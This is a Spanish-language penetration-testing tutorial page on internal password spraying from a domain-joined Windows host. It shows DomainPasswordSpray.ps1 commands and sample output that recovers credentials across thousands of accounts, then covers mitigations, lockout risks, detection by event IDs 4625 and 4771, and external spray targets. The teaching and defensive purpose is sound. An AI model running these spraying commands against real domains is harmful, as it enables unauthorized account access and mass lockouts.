# Pulverización de contraseña interna: desde Windows

---

Desde un punto de apoyo en un host de Windows unido por dominio, el[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)La herramienta es altamente efectiva. Si estamos autenticados al dominio, la herramienta generará automáticamente una lista de usuarios desde Active Directory, consultará la política de contraseña de dominio y excluirá las cuentas de usuario dentro de un intento de bloqueo. Al igual que cómo ejecutamos el ataque de pulverización de nuestro host de Linux, también podemos proporcionar una lista de usuarios a la herramienta si estamos en un host de Windows pero no autenticados al dominio. Podemos encontrarnos con una situación en la que el cliente quiere que realicemos pruebas desde un dispositivo Windows administrado en su red en la que podamos cargar herramientas. Podemos estar físicamente en el sitio en sus oficinas y deseamos probar desde una VM de Windows, o podemos obtener una posición inicial a través de algún otro ataque, autenticarnos en un host en el dominio y realizar la pulverización de contraseñas en un intento de obtener credenciales para una cuenta que tenga más derechos en el dominio.

Hay varias opciones disponibles para nosotros con la herramienta. Dado que el anfitrión se une al dominio, omitiremos el`-UserList`Marcar y dejar que la herramienta genere una lista para nosotros. Suministraremos el`Password`bandera y una sola contraseña y luego use el`-OutFile`marcar para escribir nuestra salida en un archivo para su uso posterior.

#### Uso de DomainPasswordSpray.ps1

  Pulverización de contraseña interna: desde Windows

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

También podríamos utilizar Kerbrute para realizar los mismos pasos de enumeración y pulverización del usuario que se muestran en la sección anterior. La herramienta está presente en el`C:\Tools`Directorio Si desea trabajar a través de los mismos ejemplos desde el host de Windows proporcionado.

---

## Mitigaciones

Se pueden tomar varios pasos para mitigar el riesgo de ataques de pulverización de contraseña. Si bien ninguna solución única evitará por completo el ataque, un enfoque de defensa en profundidad hará que los ataques de pulverización de contraseña sean extremadamente difíciles.

|Técnica|Descripción|
|---|---|
|`Multi-factor Authentication`|La autenticación multifactor puede reducir en gran medida el riesgo de ataques de pulverización de contraseña. Existen muchos tipos de autenticación multifactor, como notificaciones push a un dispositivo móvil, una contraseña rotativa única (OTP) como el autenticador de Google, la tecla RSA o las confirmaciones de mensajes de texto. Si bien esto puede evitar que un atacante obtenga acceso a una cuenta, ciertas implementaciones de factores multifactor aún revelan si la combinación de nombre de usuario/contraseña es válida. Es posible reutilizar esta credencial contra otros servicios o aplicaciones expuestas. Es importante implementar soluciones multifactor con todos los portales externos.|
|`Restricting Access`|A menudo es posible iniciar sesión en aplicaciones con cualquier cuenta de usuario de dominio, incluso si el usuario no necesita acceder a ella como parte de su papel. En línea con el principio de menor privilegio, el acceso a la aplicación debe estar restringido a aquellos que lo requieren.|
|`Reducing Impact of Successful Exploitation`|Una victoria rápida es garantizar que los usuarios privilegiados tengan una cuenta separada para cualquier actividad administrativa. Los niveles de permiso específicos de la aplicación también deben implementarse si es posible. También se recomienda la segmentación de la red porque si un atacante está aislado a una subred comprometida, esto puede ralentizar o detener por completo el movimiento lateral y un compromiso aún más.|
|`Password Hygiene`|Educar a los usuarios sobre la selección de contraseñas difíciles de adivinar, como las frases de pases, puede reducir significativamente la eficacia de un ataque de pulverización de contraseña. Además, el uso de un filtro de contraseña para restringir las palabras del diccionario comunes, los nombres de meses y estaciones, y las variaciones en el nombre de la compañía hará que sea bastante difícil para un atacante elegir una contraseña válida para los intentos de pulverización.|

---

## Otras consideraciones

Es vital asegurarse de que la política de bloqueo de contraseña de su dominio no aumente el riesgo de denegación de ataques de servicio. Si es muy restrictivo y requiere una intervención administrativa para desbloquear cuentas manualmente, un spray de contraseña descuidado puede bloquear muchas cuentas dentro de un período corto.

---

## Detección

Algunos indicadores de ataques de pulverización de contraseña externos incluyen muchos bloqueos de cuentas en un período corto, registros de servidor o aplicación que muestran muchos intentos de inicio de sesión con usuarios válidos o inexistentes, o muchas solicitudes en un período corto a una aplicación o URL específica.

En el registro de seguridad del controlador de dominio, muchas instancias de ID de eventos[4625: una cuenta no pudo iniciar sesión](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)En un período corto puede indicar un ataque de pulverización de contraseña. Las organizaciones deben tener reglas para correlacionar muchas fallas de inicio de sesión dentro de un intervalo de tiempo establecido para activar una alerta. Un atacante más inteligente puede evitar la pulverización de contraseñas de SMB y, en cambio, apuntar a LDAP. Las organizaciones también deben monitorear la identificación del evento[4771: Falló la preautenticación de Kerberos](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), que puede indicar un intento de pulverización de contraseña LDAP. Para hacerlo, necesitarán habilitar el registro de Kerberos. Este[correo](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing)Detalles investigaciones sobre detectar la pulverización de contraseñas utilizando el registro de eventos de seguridad de Windows.

Con estas mitigaciones finamente ajustadas y con el registro habilitado, una organización estará bien posicionada para detectar y defender contra ataques de pulverización de contraseñas internos y externas.

---

## Pulverización de contraseña externa

Mientras está fuera del alcance de este módulo, la pulverización de contraseñas también es una forma común que los atacantes usan para intentar establecerse en Internet. Hemos tenido mucho éxito con este método durante las pruebas de penetración para obtener acceso a datos confidenciales a través de bandejas de entrada de correo electrónico o aplicaciones web, como sitios de intranet externamente. Algunos objetivos comunes incluyen:

- Microsoft 0365
- Intercambio web de Outlook
- Intercambiar acceso web
- Skype para negocios
- Servidor lync
- Portales de Servicios de Desktop Remote de Microsoft (RDS)
- Portales de Citrix con autenticación AD
- Implementaciones de VDI utilizando autenticación AD como VMware Horizon
- Portales VPN (Citrix, SonicWall, OpenVPN, Fortinet, etc. que usan autenticación AD)
- Aplicaciones web personalizadas que utilizan la autenticación AD

---

## Moviéndose más profundo

Ahora que tenemos varios conjuntos de credenciales válidas, podemos comenzar a profundizar en el dominio realizando una enumeración acreditada con varias herramientas. Caminaremos a través de varias herramientas que se complementan entre sí para darnos la imagen más completa y precisa de un entorno de dominio. Con esta información, trataremos de movernos lateral y verticalmente en el dominio para finalmente alcanzar el objetivo final de nuestra evaluación.